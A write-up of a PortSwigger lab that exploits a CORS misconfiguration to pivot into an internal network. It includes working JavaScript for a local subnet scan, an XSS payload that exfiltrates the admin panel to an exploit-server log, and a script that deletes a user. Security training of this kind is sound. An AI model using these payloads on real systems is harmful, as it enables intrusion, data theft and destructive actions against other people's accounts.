# CORS vulnerability with internal network pivot attack

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack), you'll learn: CORS vulnerability with internal network pivot attack! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★★★★☆

## Background

This website has an insecure [CORS](https://portswigger.net/web-security/cors) configuration in that it trusts all internal network origins.

This lab requires multiple steps to complete. To solve the lab, craft some JavaScript to locate an endpoint on the local network (`192.168.0.0/24`, port `8080`) that you can then use to identify and create a CORS-based attack to delete a user. The lab is solved when you delete user `Carlos`.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-4/images/Pasted%20image%2020221227072920.png)

**In the lab's background, it said:**

> This website has an insecure [CORS](https://portswigger.net/web-security/cors) configuration in that it trusts all internal network origins.

**Let's go to the exploit server, and scan the local network (`192.168.0.0/24`, port `8080`):**
```html
<html>
    <head>
        <title>CORS-4</title>
    </head>
    <body>
        <script>
        var q = [], collaboratorURL = 'http://exploit-0a7f00490417a1aac052b207013a00cb.exploit-server.net/log';

        for(i=1;i<=255;i++) {
            q.push(function(url) {
                return function(wait) {
                    fetchUrl(url, wait);
                }
            }('http://192.168.0.'+i+':8080'));
        }

        for(i=1;i<=20;i++){
            if(q.length)q.shift()(i*100);
        }

        function fetchUrl(url, wait) {
            var controller = new AbortController(), signal = controller.signal;
            fetch(url, {signal}).then(r => r.text().then(text => {
                location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
            }))
            .catch(e => {
                if(q.length) {
                    q.shift()(wait);
                }
            });
            setTimeout(x => {
                controller.abort();
                if(q.length) {
                    q.shift()(wait);
                }
            }, wait);
        }
        </script>
    </body>
</html>
```

**Then, host it in the exploit server and deliver it to the victim:** 

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-4/images/Pasted%20image%2020221227073641.png)

**Exploit server access log:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-4/images/Pasted%20image%2020221227073715.png)

**Copy and paste that to [CyberChef](https://gchq.github.io/CyberChef/):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-4/images/Pasted%20image%2020221227073826.png)

**As you can see, in `192.168.0.28:8080`, there is an internal website:**
```html
<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>CORS vulnerability with internal network pivot attack</title>
    </head>
    <body>
[...]
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <form class=login-form method=POST action=/login>
                            <input required type="hidden" name="csrf" value="GosySyayHEHiWUtqCKSznVQvBVH18gXa">
                            <label>Username</label>
                            <input required type=username name="username">
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                </div>
            </section>
        </div>
    </body>
</html>
```

**Looks like it's an login page in our lab:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-4/images/Pasted%20image%2020221227074756.png)

Next, we need to **find an XSS(Cross-Site Scripting) vulnerability in that login page**. If we found one, maybe we can go to the admin panel and delete user `carlos`!

**To do so, we'll again write another JavaScript:**
```html
<html>
    <head>
        <title>CORS-4</title>
    </head>
    <body>
        <script>
            function xss(url, text, vector) {
                location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
            }

            function fetchUrl(url, collaboratorURL){
                fetch(url).then(r=>r.text().then(text=>
                {
                    xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
                }
                ))
            }

            fetchUrl("http://192.168.0.28:8080", "http://exploit-0a7f00490417a1aac052b207013a00cb.exploit-server.net/log");
        </script>
    </body>
</html>
```

**Then, host it on the exploit server, deliver it to the victim:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-4/images/Pasted%20image%2020221227075207.png)

**Check exploit server access log:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-4/images/Pasted%20image%2020221227075253.png)

```html
[...]
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href="/">Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account?id=administrator">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <form style="margin-top: 1em" class="login-form" action="/admin/delete" method="POST">
                        <input required="" type="hidden" name="csrf" value="dyNlR2Q5cFUGqxIWTSaSfB4DIT25V2mg">
                        <label>Username</label>
                        <input required="" type="text" name="username">
                        <button class="button" type="submit">Delete user</button>
                    </form>
                </div>
            </section>
        </div>
```

As you can see, the XSS payload worked, and **the `<iframe>` tag successfully pointed to the admin panel(`/admin`).**

**Let's delete user `carlos`!**
```html
<html>
    <head>
        <title>CORS-4</title>
    </head>
    <body>
        <script>
            function xss(url, text, vector) {
                location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
            }

            function fetchUrl(url){
                fetch(url).then(r=>r.text().then(text=>
                {
                xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
                }
                ))
            }

            fetchUrl("http://192.168.0.28:8080");
        </script>
    </body>
</html>
```

**Again, host it, deliver exploit to victim:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-4/images/Pasted%20image%2020221227075703.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-4/images/Pasted%20image%2020221227075710.png)

We successfully deleted user `carlos`!

# What we've learned:

1. CORS vulnerability with internal network pivot attack